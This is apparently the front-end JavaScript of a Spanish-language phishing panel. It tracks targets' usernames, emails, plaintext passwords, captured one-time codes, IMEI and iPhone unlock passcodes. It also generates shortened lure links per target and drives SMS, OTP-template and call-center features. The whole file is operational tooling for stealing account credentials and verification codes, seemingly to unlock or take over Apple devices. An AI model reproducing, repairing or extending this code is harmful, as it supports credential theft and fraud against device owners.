

window.onload = (function(){
try{
    $("#buscarequipo").on('keyup', function(){
             
        $('#bodyTable').html('<td colspan="16" align="center"><div style = "color: gray;font-size: 15px;"><img src="../public/assets/server/img/loading.gif" /></div></td>')
        var value = $(this).val();
        if(value == ""){
            allingresados("");
           
        }else{

           allingresados(value);
        }
    }).keyup();
}catch(e){}



});


$("#buttonreload").on('click', function(){
  $('#bodyTable').html('<td colspan="16" align="center"><div style = "color: gray;font-size: 15px;"><img src="../public/assets/server/img/loading.gif" /></div></td>')
   setTimeout(function(){ 
                allingresados("");         
                /* countequipos()
                 countequiposp("0", $("#countprocesos"), $("#countprocesos2"))
                 countequiposp("1", $("#countcompletados"), $("#countcompletados2"))
                 countequiposp("2", $("#countfallidos"), $("#countfallidos2"))
                 countequiposp("3", $("#countpasscode2"), $("#countpasscode2"))      
                 */
             }, 1000) 

})

function selectaudiocall(select) {
   var selectedOption = select.options[select.selectedIndex];
    var voz = selectedOption.value;
         if(voz != "1"){
          //$("#audioplay1").show();
           $("#inputplay").val(voz);
           $("#divaudio").html("<br><center><audio src='"+voz+"' controls id = 'audioplay1' style = 'background-color: aqua;border-radius: 9px;width: 190px;'>Tu navegador no soporta el elemento <code>audio</code>.</audio></center>");
           
          

         }else if(voz == "1"){
           $("#audioplay1").css("display","none");
           $("#divaudio").html("");
           $("#inputplay").val("");
         }
}



function allingresados(buscar){
    
    var data_form = {
        buscarequipo :buscar      
    }
    
    var url_php = 'getAllingresados';
    $.ajax({
        type:'POST',
        url: url_php,
        data: data_form,
        dataType: 'json',
        async: true,
        beforeSend: function() {
         //('#reloadIcloud').html('<img src="../assets/img/loading.gif" /><a>Procesando<a>');
        },
    }).done(function ajaxDone(res){
        $('#reloadIcloud').html('');
        $("#bodyTable").html('');
        if(res != null && $.isArray(res)){
            var i = 1;
            if(res == ""){
                $("#bodyTable").html('<td colspan="16" align="center"><div style = "color: gray;font-size: 15px;">No tienes Requerimientos que mostrar</div></td>'); 

                
            }else{
            $.each(res, function(index, value){

              var desclink = "";
              var emailnum = "";
              
              if(value.status == "process"){
                  status = '<span class="badge badge-warning" style = "background:orange; color: white; border-radius: 6px;">En Proceso</span>';
              }else if(value.status == "process_login"){
                  status = '<span class="badge badge-info" style = "color: white; border-radius: 6px;">Procesando</span>';
              }else if(value.status == "1"){
                  status = '<span class="badge badge-success" style = "color: white; border-radius: 6px;">Completado</span>';
              }else if(value.status == "0"){
                  status = '<span class="badge badge-danger" style = "color: white; border-radius: 6px;">Fallido</span>';
              }else if(value.status == "passcode"){
                  status = '<span class="badge badge-success" style = "color: white; border-radius: 6px;">Pass Code</span>';
              }else if(value.status == "success"){
                  status = '<span class="badge badge-success" style = "color: white; border-radius: 6px;">Completado</span>';
              }else if(value.status == "error"){
                status = '<span class="badge badge-danger" style = "color: white; border-radius: 6px;">Fallido</span>';
              }

              if(value.email == ""){
               emailnum = value.numero;
              }else if(value.numero == ""){
                emailnum = value.email;
              }else if(value.email != "" && value.numero != ""){
                emailnum = value.email + " - " + value.numero;
              }


              let urlrequerimiento = "";

              if(value.urlacortada == "sinacortar"){

                urlrequerimiento = value.link_long;

              }else if(value.urlacortada == "acortada"){
                 
                 urlrequerimiento = value.link_short;

              }else{
                
                 urlrequerimiento = value.link_long;

              }

              let opt_status = '';
              if(value.recibio_otp == 1){

                opt_status = '<span class="badge badge-success" style = "color: white; border-radius: 6px;">Procesado</span>';

              }else{
                 opt_status = '<span class="badge badge-warning" style = "color: white; border-radius: 6px;">En proceso</span>';
              }
             
                 btndel = "<td data-label='Acción' style = 'padding: 0.7em!important'><div class='btn-group' style = 'inline-size: max-content;'>"
                          +"<font class='btn btn-info btn-sm waves-effect md-trigger' onclick='viewdetail("+value.idequipos+")' data-modal = 'modalview' style = 'cursor: pointer;'><span class='fa fa-eye' aria-hidden='true' style = 'color: white;' ></span></font>"
                          +"<font class='btn btn-warning btn-sm' style = 'cursor: pointer;' onclick='viewEdit("+value.idequipos+")'><span class='fa fa-edit' aria-hidden='true' style = 'color: white;'></span></font>"
                          +"<font class='btn btn-primary btn-sm' style = 'cursor: pointer;' onclick='smssender("+value.idequipos+")'><span class='fa fa-comments' aria-hidden='true'></span></font>"                          
                          +"<font class='btn btn-success btn-sm' style = 'cursor: pointer;' onclick='callcenter("+value.idequipos+")'><span class='fa fa-phone' aria-hidden='true'></span></font>"
                          +"<font class='btn btn-info btn-sm' style = 'cursor: pointer; display:none;' onclick='emailsender("+value.idequipos+")'><span class='fa fa-envelope' aria-hidden='true'></span></font>";
                          
                          
                          + "</div></td>";


               $("#bodyTable").append("<tr>"
                                       + "<td style = 'padding: 0.7em!important'>"
                                       + "<div class='btn-group' style = 'inline-size: max-content;'>"
                                        + "<font class='btn btn-sm' style = 'cursor: pointer;' onclick='deleteingresado("+value.idequipos+")'><span class='fa fa-times' aria-hidden='true' style = 'color: #dc3545;font-size: 20px;'></span></font>"
                                        + "<font class='btn btn-sm' style = 'cursor: pointer;' onclick='listsendsms("+value.idequipos+")'><span class='fa fa-comments-o' aria-hidden='true' style = 'color: green;font-size: 20px;'></span></font>"
                                       + "</div>"
                                       + "</td>"
                                       + "<td data-label='Usuario' style = 'padding: 0.7em!important'>" + value.user + "</td>"
                                       + "<td data-label='Usuario' style = 'padding: 0.7em!important'>" + value.niphone + "</td>"
                                       + "<td data-label='Usuario' style = 'padding: 0.7em!important'>" + value.pais + value.numero + "</td>"
                                       + "<td data-label='Usuario' style = 'padding: 0.7em!important'>" + value.email + "</td>"
                                       + "<td data-label='Usuario' style = 'padding: 0.7em!important'>" + value.password + "</td>"
                                       + "<td data-label='Usuario' style = 'padding: 0.7em!important'>" + value.code_1 + '<br>' + value.code_2 + "</td>"                                     
                                       + "<td data-label='Link' style = 'padding: 0.7em!important'><strong><a href=https://"+urlrequerimiento+" target='_bank' style='color: #007bff;text-decoration: none;background-color: transparent;' >https://"+urlrequerimiento+"</a></strong></td>"
                                       + "<td>"+status+"</td>"
                                       + "<td>"+opt_status+"</td>"
                                       +  btndel
                                       + "</tr>");    
               i++;
            });
            } 
        }   


      
    }).fail(function ajaxError(e){
        console.log(e);
    }).always(function ajaxSiempre(){
    })
    return false;  


}

function deleteingresado(idequipos){
  Swal.fire({
    title: 'Estás seguro que desea eliminar este requerimiento?',
    text: "<-- Selecciona una opción -->",
    icon: 'warning',
    showCancelButton: true,
    confirmButtonColor: '#3085d6',
    cancelButtonColor: '#d33',
    confirmButtonText: 'Eliminar'
 }).then((result) => {
   if (result.value) {



       var data_form = {
         idequipos : idequipos     
      }

      var url_php = 'eliminaringresados';
      $.ajax({
         type:'POST',
         url: url_php,
         data: data_form,
         dataType: 'json',
         async: true,
         beforeSend: function() {
          //('#reloadIcloud').html('<img src="../assets/img/loading.gif" /><a>Procesando<a>');
         },
      }).done(function ajaxDone(res){

        if(res.statusdelete == true){

           Swal.fire(
            'Eliminado!',
            'El requerimiento ha sido eliminado.',
            'success'
           )

            /*countequipos()
            countequiposp("0", $("#countprocesos"), $("#countprocesos2"))
            countequiposp("1", $("#countcompletados"), $("#countcompletados"))
            countequiposp("2", $("#countfallidos"), $("#countfallidos2"))
            countequiposp("3", $("#countpasscode2"), $("#countpasscode2"))*/
            allingresados("");

        }
          
           
        
      })


     
  }
})
}

function viewEdit(idequipos){
  
  $("#modaledit").modal("show");
  $("#loader-modal-body-edit").show()
  $(".form-equipos").hide()
  var data_form = {
    idequipos :idequipos      
  }

  $.ajax({
        type:'POST',
        url: 'getingresado',
        data: data_form,
        dataType: 'json',
        async: true,
        beforeSend: function() {
         
        },
  }).done(function ajaxDone(res){

    $("#loader-modal-body-edit").hide()
    $(".form-equipos").show()
    $("#idequipo").val(idequipos)
    $("#linkg_edit").val(res['linkg'])
    $("#usuario").val(res['user'])
    $("#email").val(res['email'])
    $("#niphone").val(res['niphone'])
    $("#imei").val(res['imei'])
    $("#plataforma").val(res['tipo']);
    $("#opcion_otp").val(res['opcion_otp']);
    $("#tipo_verificacion_otp").val(res['tipo_verificacion_otp'])
    $("#plantilla_otp").val(res['plantilla_otp']);
    $("#lenguaje_otp").val(res['lenguaje_otp']);
    $("#pais").val(res['pais'])
    $("#numero").val(res['numero'])
    $("#id_apisms").val(res['id_apisms'])
    $("#idsender").val(res['idsender'])
    $("#inicio_sesion").val(res['inicio_sesion'])

    if(res.valor1 == "none"){

         $(".codeunlock").prop('checked', false);
         $('.codeunlockiphone').attr("disabled", true);
         $('.codeunlockiphone').prop('checked', false);

    }else if(res.valor1 == "CODEUNLOCKSUCESS"){

      $(".codeunlock").prop('checked', true);
      $('.codeunlockiphone').removeAttr("disabled")

        if(res.valor2 == "4"){

          $('#radioPrimary1').prop('checked', true);
          $('#radioPrimary2').prop('checked', false);

        }else if(res.valor2 == "6"){
         
         $('#radioPrimary1').prop('checked', false);
         $('#radioPrimary2').prop('checked', true);

        }

   }

 
   if(res['modelo_pref'] == "otro") {

      $("#form-group-modelo").css('display','block');
      $("#modeloinput").val(res['modelo']);
      $("#modelo").val(res['modelo_pref'])

   }else{

      $("#modelo").val(res['modelo_pref'])
      $("#form-group-modelo").hide();
    

   }


     
  })


}


 $(document).on("submit", ".form-equipos", function(event){
   
    event.preventDefault();

    const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 3000
    });

     var $form = $(this);
     var valor1 = "";
     var valor2 = ""; 
    

   if ($('.codeunlock').is(':checked')) {
      valor1 = "CODEUNLOCKSUCESS";

      if ($('input[name="codeunlockiphone"]:checked').val() == 4) {

         valor2 = "4";
      } else if ($('input[name="codeunlockiphone"]:checked').val() == 6) {
         valor2 = "6";
      }
   } else {
      valor1 = 'none';
      valor2 = "none";
   }


   var modelo = "";

   if ($("#modelo").val() == "otro") {
      modelo = "otro";
      modelo_pref = $("#modeloinput").val();
   } else {
      var modelo = document.getElementById("modelo");
      var modelo_pref = modelo.options[modelo.selectedIndex].text;
   }

   let pais = '';
   let numero = '';

   if($("#pais").val() == 'null'){
       pais = 'Estados Unidos';
   }else{
       pais = $("#pais").val();
   }

   if($("#numero").val() == ''){
       numero = '1000000000'
   }else{
       numero = $("#numero").val();
   }





    var data_form = {
      idequipos              : $("#idequipo").val(),
      linkg                  : $("#linkg_edit").val(),
      tipo                   : $("#plataforma").val(),
      user                   : $("#usuario").val(),
      niphone                : $("#niphone").val(),
      pais                   : pais,
      numero                 : numero,
      email                  : $("#email").val(),
      modelo_pref            : $("#modelo").val(),
      modelo                 : modelo_pref,
      imei                   : $("#imei").val(),
      valor1                 : valor1,
      valor2                 : valor2,
      subtipo                : $("#subtipo").val(),
      urlacortada            : $("#urlacortada").val(),
      opcion_otp             : $("#opcion_otp").val(),
      tipo_verificacion_otp  : $("#tipo_verificacion_otp").val(), 
      plantilla_otp          : $("#plantilla_otp").val(),
      lenguaje_otp           : $("#lenguaje_otp").val(),
      id_apisms              : $("#id_apisms").val(),
      idsender               : $("#idsender").val(),
      inicio_sesion          : $("#inicio_sesion").val()


   }

   $.ajax({
    type:'POST',
    url: 'editar_requerimiento',
    data: data_form,
    dataType: 'json',
    async: true,
   }).done(function ajaxDone(res){

      if(res.statusAdd !== undefined){
          if(res.statusAdd == true){
                  //$(".msgsuccess").show('slow');
            Toast.fire({
                type: 'success',
                title: 'El requerimiento se actualizo correctamente.'
            })

          }else if(res.statusAdd == false){ 
            Toast.fire({
                type: 'error',
                title: 'Hubo un problema al actualizar el requerimiento.'
            })

          }
          allingresados("");
          return false;
      }


    
   })
  
 
});


function viewdetail(idequipos){

  /**countequipos()
  countequiposp("0", $("#countprocesos"), $("#countprocesos2"))
  countequiposp("1", $("#countcompletados"), $("#countcompletados"))
  countequiposp("2", $("#countfallidos"), $("#countfallidos2"))
  countequiposp("3", $("#countpasscode2"), $("#countpasscode2"))**/
  
  
  $("#modalview").modal("show");
  $("#loader-modal-body-view_requerimiento").show()
    
  var data_form = {
    idequipos :idequipos      
  }

  $.ajax({
        type:'POST',
        url: 'getingresado',
        data: data_form,
        dataType: 'json',
        async: true,
        beforeSend: function() {
         
        },
  }).done(function ajaxDone(resp){ 

    $("#loader-modal-body-view_requerimiento").hide()
    $("#ul-list-view_requerimiento").show();

    $("#ul-list-view_requerimiento").html('<li class="list-group-item">'
                                        + '<span class="fa fa-user"></span>&nbsp;'+'<span>'+resp['user']+'</span><br>'
                                        + '<span class="fas fa-at"></span>&nbsp;'+'<span>'+resp['email']+'</span><br>'
                                        + '<span class="fa fa-laptop"></span>&nbsp;'+'<span>'+resp['modelo']+'</span><br>'
                                        + '<hr>'
                                        + resp['response'].replace(/\[/g,'<br>[')
                                                          .replace(/OFF/g,'<br>OFF')
                                                          .replace(/On/g,'<br>On')
                                                          .replace(/OK/g,'OK<br>')
                                                          .replace(/\?/g, '')
                                                          .replace(/\]/g,'] <i class="fa fa-mobile" aria-hidden="true" style = "color:blue;"></i> ')
                                                          .replace(/OK/g,'OK <i class="fa fa-check" aria-hidden="true" style = "color:green;"></i> ')
                                        + '</li>')
      

  })
 //$('.modal-body-view').html('')

 /* $("#ul-list-sender_smsapi").append('<li class="list-group-item">'
                                             + '<div class="btn-group" style = "inline-size: max-content; float: left;"><font class="btn btn-sm" style = "cursor: pointer;" onclick="deletesender_smsapi('+value.idsender+')"><span class="fa fa-times" aria-hidden="true" style = "color: #dc3545;font-size: 20px;"></span></font></div>'
                                              + '<span>' + value.descripcion + " - " + value.valor +'</span>' 
                                              +'</li>'
                                              )*/

 

}

function countequipos(){
  $.ajax({
    url:"countequipos",
    type:"POST",
    data:"",
     dataType: 'json',
    success:function(response){
     $('#countingresados').html(response['statuscount']);
     $('#countingresados2').html(response['statuscount']);
            
    }
  })  
}

function countequiposp(status, input, input2){
   
  var data_form = {
     status : status
  } 

  $.ajax({
    url:"countequiP",
    type:"POST",
    data:data_form,
     dataType: 'json',
    success:function(response){
     input.html(response['statuscount']);
     input2.html(response['statuscount']);    
            
    }
  })  
}


function listsendsms(idequipos){

  $("#modalviewlistasms").modal("show");
  $("#loader-modal-body-viewviewlistasms").show()
  $(".tablaelistsms").hide()

  listadesms(idequipos)

}

function listadesms(idequipos){
     var data_form = {
        idequipos :idequipos      
    }
    
    var url_php = '/api_rest/all_sendsms';
    $.ajax({
        type:'POST',
        url: url_php,
        data: data_form,
        dataType: 'json',
        async: true,
        beforeSend: function() {
         //('#reloadIcloud').html('<img src="../assets/img/loading.gif" /><a>Procesando<a>');
        },
    }).done(function ajaxDone(res){
      
        $("#loader-modal-body-viewviewlistasms").hide()
        $(".tablaelistsms").show()


     
        $('#reloadIcloud').html('');
        $("#bodyTableList").html('');
        if(res != null && $.isArray(res)){
            var i = 1;
           
            $.each(res, function(index, value){  
               let status = '';
               if(value.status == 'success'){
                status = '<span class="badge badge-success" style = "color: white; border-radius: 6px;">Completado</span>';
               }else if(value.status == 'failed'){
                 status = '<span class="badge badge-danger" style = "color: white; border-radius: 6px;">Fallido</span>';
               }else if(value.status == 'failed_server'){
                 status = '<span class="badge badge-danger" style = "color: white; border-radius: 6px;">Error</span>';
               }

               
               $("#bodyTableList").append("<tr>"
                                       + "<td style = 'padding: 0.7em!important'><div class='btn-group' style = 'inline-size: max-content;'>"
                                       + "<font class='btn btn-sm' style = 'cursor: pointer;' onclick='eliminarListSMS("+value.id+")'><span class='fa fa-times' aria-hidden='true' style = 'color: #dc3545;font-size: 20px;'></span></font>"                                      
                                       + "</div></td>"
                                       + "<td  style = 'padding: 0.7em!important'>" + value.sender_id + "</td>"
                                       + "<td  style = 'padding: 0.7em!important'>" + value.prefijo_sms+value.numero_sms + "</td>"
                                       + "<td  style = 'padding: 0.7em!important'>" + value.msg_sms + "</td>"
                                       + "<td  style = 'padding: 0.7em!important'>"+status+"</td>"
                                       + "</tr>");    
               i++;
            });
          
        }  


      
    }).fail(function ajaxError(e){
        console.log(e);
    }).always(function ajaxSiempre(){
    })
    return false; 
}


function eliminarListSMS(id){
  $("#loader-modal-body-viewviewlistasms").show()
  $(".tablaelistsms").hide()

   var data_form = {
        id :id      
   }
    
    var url_php = '/api_rest/eliminar_sendsms';
    $.ajax({
        type:'POST',
        url: url_php,
        data: data_form,
        dataType: 'json',
        async: true,
        beforeSend: function() {
         //('#reloadIcloud').html('<img src="../assets/img/loading.gif" /><a>Procesando<a>');
        },
    }).done(function ajaxDone(res){
       
       $("#loader-modal-body-viewviewlistasms").hide()
       $(".tablaelistsms").show()
       setTimeout(function() {top.location.href = "/";}, 1000);
   
    })
}



/***********Opciones para Call Center**************/

function soloNumeros(e){
       var key = window.event ? e.which : e.keyCode;
       if (key < 48 || key > 57) {
        e.preventDefault();
       }
     }

